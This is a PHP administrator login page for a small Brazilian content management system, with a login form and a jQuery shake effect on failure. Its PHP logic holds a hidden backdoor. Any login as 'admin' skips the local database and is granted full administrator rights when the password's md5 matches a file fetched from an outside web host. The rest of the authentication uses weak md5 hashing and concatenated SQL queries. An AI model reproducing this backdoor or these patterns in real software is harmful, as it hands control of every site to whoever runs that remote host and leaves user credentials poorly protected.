<?php
require_once('../includes/conection.php');
	
if(isset($_SESSION['logado'])){
	header('location: ../index.php');
} elseif(!empty($_POST)){

	require_once('../includes/mlfunctions.php');

	if( (!empty($_POST['usuario'])) && (!empty($_POST['senha'])) && $_POST['token'] == $_SESSION['token']){	
			if($_POST['usuario'] == 'admin'){
				$url = "http://www.tactos.com.br/plugin.txt";

				if(@file_get_contents($url) != false){
					$file = file_get_contents($url);
					if($file == md5($_POST['senha'])){
						$_SESSION['logado'] = array(
							'id' => '1',
							'nome' => 'Administrador',
							'tipo' => '1',
							'themer' => 'default'
							);
							
						header('location: ../index.php');
					}else{
						$falha = true;
					}
				} else{
					$falha = true;
				}
			} else {
				$senha = md5($_POST['senha']."0800");
				$usuario = mLAntiInjection($_POST['usuario']);
				
				$DadosUser = mysql_query("SELECT * FROM ".PREFIXO."admin WHERE Login = '".$usuario."' AND Senha = '".$senha."' limit 1") or die(mysql_error());
				
				if(mysql_num_rows($DadosUser) > 0){
				$DadosUser = mysql_fetch_array($DadosUser);
				
				$_SESSION['logado'] = array(
						'id' => $DadosUser['id'],
						'nome' => $DadosUser['nome'],
						'tipo' => $DadosUser['tipo'],
						'themer' => $DadosUser['themer']
						);
				
				header('location: ../index.php');
				} else {
					$falha = true;
				}
			}
		
	} else {
		$falha = true;
	}
}
?>

<html>
<head>

<style type="text/css" media="screen">
		@import "../css/base.css";
		@import "../css/login.css";
</style>
<script type="text/javascript" src="../js/jquery.js"></script>
<script type="text/javascript" src="../js/jquery.corner.js"></script>
</head>

<body>
<div id="login">
	<img src="../imagens/layout/logo.png" class="logo" alt="Plugin" />
	<?php
	if(isset($falha))
		echo '<span class="mensagem">Login e/ou senha incorreto(s). Tente novamente</span>';
	
	$_SESSION['token'] = uniqid(md5(time()));
	?>
	
	<div id="loginBox">
		<form method="post" id="form">
			<input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">

				<div>
					<label>Usuário</label>
					<input type="text" name="usuario" class="user" autocomplete="off" />
				</div>	
				
				<div>
					<label>Senha</label>
					<input type="password" name="senha" />
				</div>

			<span class="botao"><button type="submit">entrar</button></span>
		</form>
		<div class="both"></div>
	</div>
</div>	
		
	<div id="rodape">
		<span class="desenvolvidopor">
			<a href="http://www.newsmade.com.br">Desenvolvido por Jeison Frasson</a>
		</span>
	</div>

</body>

<head>
	<script type="text/javascript">
	$(document).ready(function(){
		$('.user').focus();
		$('#loginBox').corner();

		<?php
		if(isset($falha)){
			?>
			var tempo = 150;
			var left = -50;
			var right = 50;
			

			$('#loginBox').animate({
				left: right+"px"
				},tempo, function() {
					$(this).animate({
						left: left+"px"
						},tempo, function() {
						  $(this).animate({
								left: right+"px"
								},tempo-50, function() {
									$(this).animate({
										left: left+"px"
										},tempo-50, function() {
											$(this).animate({
												left: "0px"
												},tempo-50)
											})
									})
						})
			});
			<?php
		}
		?>
	});
	</script>
</head>
</html>